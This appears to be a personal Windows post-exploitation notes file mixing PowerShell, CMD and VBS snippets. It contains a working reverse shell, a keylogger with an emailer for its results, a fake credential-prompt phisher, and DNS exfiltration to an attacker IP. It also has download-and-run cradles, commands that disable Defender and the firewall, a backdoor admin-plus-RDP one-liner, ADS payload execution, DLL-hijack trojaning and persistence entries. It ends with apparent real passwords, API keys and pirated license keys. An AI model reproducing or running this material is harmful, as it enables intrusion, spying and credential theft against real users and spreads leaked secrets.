    WriteToStream ($Output)
}
$StreamWriter.Close()


$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String);
$result = $sendback + 'PS '+ (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($result);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
};
$client.Close()

#Trojan CONV
echo -n  | iconv --to-code UTF-16LE | base64 -w 0
powershell -EncodedCommand

--------------------------------------------------------------------------------
[+]                   Post Exploitation Pranks                               [+]
--------------------------------------------------------------------------------
Add-Type -AssemblyName System.Speech
$Speech = New-Object System.Speech.Synthesis.SpeechSynthesizer
$Speech.SelectVoice("Microsoft David Desktop") #$Speech.SelectVoice("Microsoft Zira Deskto")
$Speech.speak("Jesus is Love")

$message = (Get-Date).ToShortTimeString()
$message = $message.ToString()
$Speech.speak("The current time is" + $message)
$Speech.speak("User logged in is " + $env:USERNAME)
$Speech.speak("Computername is " + $env:computername)
 
$Speech.Volume = 100
$speech.GetInstalledVoices() | Select-Object -ExpandProperty VoiceInfo | Select-Object -Property Culture, Name, Gender, Age

$Speech.Rate = 1

$Speech | Get-Member


#..Change Wallpaper..#
$MyWallpaper="C:\Users\Shepherd\Pictures\[H]\WindowsXP.png"
$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 
    
     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@

add-type $code 
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)

#..Persistence Wallpaper..#
$MyWallpaper="C:\wallpaper.jpg"
$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 
    
     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@

add-type $code 
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)

#..Screen-Shotter..#
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}

$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1600, 900)
screenshot $bounds "out.png"

#Ki-Loga

function ki-loga($logPath="$env:temp\ki-loga.txt") 
{
# API declaration
$APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
    
  # output file
  $no_output = New-Item -Path $logPath -ItemType File -Force

  try
  {
    Write-Host 'Kilogga started. Press CTRL+C to see results...' -ForegroundColor Red

    while ($true) {
      Start-Sleep -Milliseconds 40            
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get key state
        $keystate = $API::GetAsyncKeyState($ascii)
        # if key pressed
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock
          # translate code
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          # get keyboard state and create stringbuilder
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key          
          if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
          {
            #if success, add key to logger file
            [System.IO.File]::AppendAllText($logPath, $loggedchar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {    
    notepad $logPath
  }
}
ki-loga

#Phish Cred
function Phish
{


[CmdletBinding()]
Param ()

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter your user name and password.", "", "")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $creds.domain
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $output = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain + " Domain:"+ $authdomain.name
                $output
                break
            }
        }
    }
}

#Powershell Emailer
$TimeToRun = 2
$From = “xxxxxx@gmail.com"
$Pass = “xxxxxxxx"
$To = “xxxxxx@gmail.com
$Subject = "Keylogger Results"
$body = "Keylogger Results"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)

#VBS Script   
-----------    
Sub RunCScriptHidden()
    strSignature = Left(CreateObject("Scriptlet.TypeLib").Guid, 38)
    GetObject("new:{C08AFD90-F2A1-11D1-8455-00A0C91F3880}").putProperty strSignature, Me
#objShell.Run ("""" & Replace(LCase(WScript.FullName), "wscript", "cscript") & """ //nologo """ & WScript.ScriptFullName & """ ""/signature:" & strSignature & """"), 0, True
End Sub
Sub WshShellExecCmd()
    For Each objWnd In CreateObject("Shell.Application").Windows
        If IsObject(objWnd.getProperty(WScript.Arguments.Named("signature"))) Then Exit For
    Next
    Set objParent = objWnd.getProperty(WScript.Arguments.Named("signature"))
    objWnd.Quit
    'objParent.strRes = CreateObject("WScript.Shell").Exec(objParent.strCmd).StdOut.ReadAll() 'simple solution
    Set exec = CreateObject("WScript.Shell").Exec(objParent.strCmd)
    While exec.Status = WshRunning
        WScript.Sleep 20
    Wend
    Dim err
    If exec.ExitCode = WshFailed Then
        err = exec.StdErr.ReadAll
    Else
        output = Split(exec.StdOut.ReadAll,Chr(10))
    End If
    If err="" Then
        objParent.strRes = output(UBound(output)-1) 'array of results, you can: output(0) Join(output) - Usually needed is the last
    Else
        objParent.wowError = err
    End If
WScript.Quit
End Sub
Const WshRunning = 0,WshFailed = 1:Dim i,name,objShell
Dim strCmd, strRes, objWnd, objParent, strSignature, wowError, output, exec

Set objShell = WScript.CreateObject("WScript.Shell"):wowError=False
strCmd = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass Write-Host Hello-World."
If WScript.Arguments.Named.Exists("signature") Then WshShellExecCmd
RunCScriptHidden
If wowError=False Then
    objShell.popup(strRes)
Else
    objShell.popup("Error=" & wowError)
End If

#RDP ENABLER
------------
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

set x=createobject("wscript.shell")

x.sendkeys "^"+"{ESC}"
wscript.sleep 1000
x.sendkeys "command prompt"
wscript.sleep 1000
x.sendkeys "{ENTER}"
wscript.sleep 500
x.sendkeys "cmd /c systeminfo"
wscript.sleep 500
x.sendkeys "{ENTER}"
wscript.sleep 1000
x.sendkeys "{ENTER}"
wscript.sleep 500
x.sendkeys "exit"
wscript.sleep 500
x.sendkeys "{ENTER}"

--------------------------------------------------------------------------------
[+]                   Basic PowerShell for Pentesters                        [+]
--------------------------------------------------------------------------------
#Default PowerShell locations
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell

--------------------------------------------------------------------------------
[+]     ######----------Basic PS commands to start----------------########## [+]
--------------------------------------------------------------------------------

######--Check status--#####
Get-MpComputerStatus
Set-MpPreference -DisableRealtimeMonitoring $true #Disable

#OS version and HotFixes
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches

#Environment
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
Other connected drives
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root

#Users
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
​
#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"
​
#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred
​
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'
​
#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"

#Groups
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators

#Clipboard
Get-Clipboard

#Processes
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
Services

##Scheduled Tasks
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Network
Interfaces
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft

#Route
route print

#ARP
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State

#Hosts
Get-Content C:\WINDOWS\System32\drivers\etc\hosts

#SNMP
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse

--------------------------------------------------------------------------------
[+]        ####---------Basic CMD for Pentesters--------#######              [+]
--------------------------------------------------------------------------------
System info
Version and Patches info
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
hostname
DRIVERQUERY #3rd party driver vulnerable?

#--Environment--#
set #List all environment variables
Some env variables to highlight:
COMPUTERNAME: Name of the computer
TEMP/TMP: Temp folder
USERNAME: Your username
HOMEPATH/USERPROFILE: Home directory
windir: C:\Windows
OS:Windos OS
LOGONSERVER: Name of domain controller
USERDNSDOMAIN: Domain name to use with DNS
USERDOMAIN: Name of the domain

nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC

#Mounted disks
wmic logicaldisk get caption,description,providername

#AV
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
sc query windefend
#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

#Recycle Bin
dir C:\$Recycle.Bin /s /b
Processes, Services & Software
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software

#Domain info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
net groups /domain #List of domain groups
net group "domain computers" /domain #List of PCs connected to the domain
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
net group "Domain Controllers" /domain #List PC accounts of domains controllers
net group "Domain Admins" /domain #List users with domain admin privileges
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the grup "Domain Admins" is included here)
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
nltest /domain_trust #Mapping of the trust relationships.

#Logs & Events
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321

#Users & Groups

whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
qwinsta #Anyone else logged in?
cmdkey /list #List credential
net user /add [username] [password] #Create user
​
#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted
​
#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe

#Groups
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators
​
#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group

#List sessions
qwinsta
klist sessions
Password Policy
net accounts

#Persistence with users
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN
​
# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD
​
# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add

#--Network--#
Interfaces, Routes, Ports, Hosts and DNSCache
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"

#--Firewall--#
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles
​
NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off
​
#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop" 
​
#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
netsh firewall set service remotedesktop enable #I found that this line is not needed
sc config TermService start= auto #I found that this line is not needed
net start Termservice #I found that this line is not needed
​
#Enable Remote assistance:
reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable
​
#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
​
#Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49

#Shares
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares

#Wifi
netsh wlan show profile #AP SSID
netsh wlan show profile <SSID> key=clear #Get Cleartext Pass

#SNMP
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s

#Network Interfaces
ipconfig /all

#Misc
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list 
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file
​
#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted
​
#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden
​
#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win
​
#exe2bat to transform exe file in bat file
​
#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

#Listen address ACLs
#You can listen on 
#without being administrator.
netsh http show urlacl

#Manual DNS shell
#Attacker (Kali) must use one of these 2 options:

sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive

#Victim
for /f tokens _**_technique: This allows us to execute commands, get the first X words of each line and send it through DNS to our server
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
You can also redirect the output, and then read it.
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
Calling CMD from C code
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */
​
// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe
​
int main (){
    int i;
    i=system("net users otherAcc 0TherAcc! /add");
    i=system("net localgroup administrators otherAcc /add");
    return 0;
}
Alternate Data Streams CheatSheet (ADS/Alternate Data Stream)
Taken from 

### Discover ADS contecnt
dir /R 
streams.exe <c:\path\to\file> #Binary from sysinternals#
Get-Item -Path .\fie.txt -Stream *
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
​
###Extract content from ADS###
expand c:\ads\file.txt:test.exe c:\temp\evil.exe
esentutl.exe /Y C:\temp\file.txt:test.exe /d c:\temp\evil.exe /o
more < c:\ads\file.txt:test.exe
​
###Executing the ADS content###
​
* WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'
​
* Rundll32
rundll32 "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll",DllMain
rundll32.exe advpack.dll,RegisterOCX not_a_dll.txt:test.dll
rundll32.exe ieadvpack.dll,RegisterOCX not_a_dll.txt:test.dll
​
* Cscript
cscript "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Script.vbs"
​
* Wscript
wscript c:\ads\file.txt:script.vbs
echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js
​
* Forfiles
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\shellloader.dll:bginfo.exe"
​
* Mavinject.exe
c:\windows\SysWOW64\notepad.exe
tasklist | findstr notepad

* MSHTA
mshta "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"
(Does not work on Windows 10 1903 and newer)
​
* Control.exe
control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll
https://twitter.com/bohops/status/954466315913310209
​
* Create service and run
sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto
sc start evilservice
https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
​
* Powershell.exe
powershell -command " & {(Get-Content C:\ADS\1.txt -Stream file.exe -Raw | Set-Content c:\ADS\file.exe) | start-process c:\ADS\file.exe}"
​
* Powershell.exe
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = C:\ads\folder:file.exe}
​
* Regedit.exe
regedit c:\ads\file.txt:regfile.reg
​
* Bitsadmin.exe
bitsadmin /create myfile
bitsadmin /addfile myfile c:\windows\system32\notepad.exe c:\data\playfolder\notepad.exe
bitsadmin /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL
bitsadmin /RESUME myfile
​
* AppVLP.exe
AppVLP.exe c:\windows\tracing\test.txt:ha.exe
​
* Cmd.exe
cmd.exe - < fakefile.doc:reg32.bat
https://twitter.com/yeyint_mth/status/1143824979139579904
​
* Ftp.exe
ftp -s:fakefile.txt:aaaa.txt
https://github.com/sailay1996/misc-bin/blob/master/ads.md
​
* ieframe.dll , shdocvw.dll (ads)
echo [internetshortcut] > fake.txt:test.txt && echo url=C:\windows\system32\calc.exe >> fake.txt:test.txt rundll32.exe ieframe.dll,OpenURL C:\temp\ads\fake.txt:test.txt
rundll32.exe shdocvw.dll,OpenURL C:\temp\ads\fake.txt:test.txt
https://github.com/sailay1996/misc-bin/blob/master/ads.md
​
* bash.exe
echo calc > fakefile.txt:payload.sh && bash < fakefile.txt:payload.sh
bash.exe -c $(fakefile.txt:payload.sh)
https://github.com/sailay1996/misc-bin/blob/master/ads.md
​
* Regsvr32
type c:\Windows\System32\scrobj.dll > Textfile.txt:LoveADS
regsvr32 /s /u /i:https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Regsvr32_calc.sct Textfile.txt:LoveADS

#StartApps windows REG
get-wmiobject Win32_StartupCommand | select-object -property name,command,location | format-list
REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v SilverLight.vbs
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdate /t REG_SZ /d "%TEMP%\SilverLight.vbs"
schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe

* Using native **schtask** - Create a new task
    ```powershell
    # Create the scheduled tasks to run once at 00.00
    schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
    # Force run it now !
    schtasks /run /tn "Device-Synchronize"

	
#Resource
http://www.adamtheautomator.com

#Pkill
netstat -ano | findStr "56273"
Stop-Process -Id 3952 -Confirm -PassThru
netstat -aon | find /i "listening" | find "1234 "
https://www.hackersking.in/search/label/Windows

copy c:/windows/system32/cmd.exe c:\users\public\a.exe
echo >>c:\users\public\a.exe
c:\users\public\a.exe

wmic computersystem get Name, domain, Manufacturer, Model, Username, Roles /format:list
wmic group get Caption, InstallDate, LocalAccount, Domain, SID, Status
wmic process call create "taskmgr.exe"
wmic process where name="explorer.exe" call setpriority 64
wmic process where name="explorer.exe" call terminate

netstat -ano | findStr "56273"
Stop-Process -Id 3952 -Confirm -PassThru
netstat -aon | find /i "listening" | find "1234 "

Onedrive Dlls 
Secur32.dll:VERSION.dll:WTSAPI32.dll:USERENV.dll
.\Siofra64.exe --mode file-scan -f "C:\Windows" -r --enum-dependency --dll-hijack --auto-elevate --signed
.\Siofra64.exe --mode file-scan -f "C:\Users\Shepherd\AppData\Local\Microsoft\OneDrive\" -r --enum-dependency --dll-hijack --auto-elevate --signed
.\Siofra64.exe --mode infect -f C:\Windows\system32\VERSION.dll -o VERSION.dll  --payload-type process --payload-path C:\Users\Shepherd\Desktop\9001.exe
cp .\VERSION.dll C:\Users\Shepherd\AppData\Local\Microsoft\OneDrive\
C:\Users\Katana\Desktop\Trojan\Shepherd\Project1\Microsoft\bin\Debug\Microsoft.exe

taskkill /im explorer.exe /f
C:\Users\%USERNAME%\AppData\Local\Microsoft\WindowsApps\
C:\Users\%USERNAME%\AppData\Local\TEMP

-----------------------------------------------------------------------------------
[+]                           WSL INSTALL                                       [+]
-----------------------------------------------------------------------------------

dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
Invoke-WebRequest -Uri https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi -OutFile 
WSLUpdate.msi -UseBasicParsing
msiexec.exe /package WSLUpdate.msi /quiet
wsl --set-default-version 2
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All
Invoke-WebRequest -Uri https://aka.ms/wsl-ubuntu-1804 -OutFile Ubuntu.appx -UseBasicParsing
Add-AppxPackage .\Ubuntu.appx
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
choco install microsoft-windows-terminal microsoft-teams vscode atom git terraform awscli lxc multipass nano nmap wget curl

-----------------------------------------------------------------------------------
[+]                              MY CREDS                                       [+]
-----------------------------------------------------------------------------------
Shodan
riddickpatel@lalala.fun
user Anacondasec:pass RogersMontari7.
account:sajival@evxmail.net:passwrd:RogersMontari7.

shodan apikey 
xNoK9CjmgiVLVe6gh7VCG46EiDfgJa2o:p4OTJVW2vUTJQg7uv8YB97EddXiIlZp3
i3rUJSinkIiPDtNreKolsj15oBD3fPz8

VMware Workstation Pro 16 lic
ZF3R0-FHED2-M80TY-8QYGC-NPKYF:ZF71R-DMX85-08DQY-8YMNC-PPHV8
ZF71R-DMX85-08DQY-8YMNC-PPHV8:YF390-0HF8P-M81RQ-2DXQE-M2UT6

VS2022
Pro:TD244-P4NB7-YQ6XK-Y8MMM-YWV2J:
Ent:VHF9H-NXBBB-638P6-6JHCY-88JWH

PEARSON
Username RojahsMontari:Password 9933557700J.

Visual Studio 2019 Professional
NYWVH-HT4XC-R2WYW-9Y3CM-X4V3Y:Visual Studio 2019 Enterprise
BF8Y8-GN2QH-T84XB-QVY3B-RC4DF

Visual Studio Professional 2015 :KEY：HMGNV-WCYXV-X7G9W-YCX63-B98R2 
Visual Studio Enterprise   2015 :KEY：HM6NR-QXX7C-DFW2Y-8B82K-WTYJV

Windows 10      pro:VK7JG-NPHTM-C97JM-9MPGT-3V66T
Ashampoo burning studio 2016:B216A3-77E522-53A90F

St.Teresa 26535279

#OPENVPN
https://portmap.io/configs
USERNAME Shepherd:PASSWORD RR993355770011..
email cumlozognu@vusra.com:https://tempail.com/en/
tcp://Shepherd-56273.portmap.io:56273 => 9001

#Openvpn Server
tcp://Anaconda-26405.portmap.io:49858 => 9000 
https://tempail.com/en/mail_814725453/
USERNAME Anaconda:PASSWORD RR993355770011..
email deltuvoyda@vusra.com

#Url shortener
Shepherd:caknebespe@vusra.com:https://tinyurl.com/app
openvpn --config Shepherd.Samurai.ovpn

#Github
https://raw.githubusercontent.com/m0nt4r1/Shepherd/main/.ps1
https://raw.githubusercontent.com/r0j4hs/Shepherd/main/.vbs

https://rojahthedogger.openvpn.com/get-connected/admins
993355770011JJ..

#Nessus
user Anaconda sec 87B1-928A-3B6F-86AE-EFB6
https://localhost:8834

#Ngrok && Maltego
riddickpatel@zsero.com:RogersMontari7.
ngrock apikey 2LdePETHXmcwgjrtQMQi2_3j8zHpfhgkxYHMzqYQF8D

#OPenvas
https://127.0.0.1:9392